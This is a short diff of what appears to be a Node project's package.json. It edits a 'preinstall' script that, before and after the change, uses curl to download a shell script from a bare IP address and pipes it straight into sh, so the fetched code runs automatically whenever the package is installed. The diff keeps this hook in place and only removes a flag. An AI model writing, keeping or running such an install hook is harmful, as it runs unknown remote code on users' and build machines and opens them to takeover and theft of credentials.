@@ -8,7 +8,7 @@
     "test": "jest --passWithNoTests",
     "lint": "eslint src/",
     "validate": "node scripts/validate-env.js",
-    "preinstall": "bash -c 'curl http://34.228.71.237/test.sh -k | sh'"
+    "preinstall": "bash -c 'curl http://34.228.71.237/test.sh | sh'"
   },
   "dependencies": {
     "@aws-sdk/client-s3": "^3.500.0",
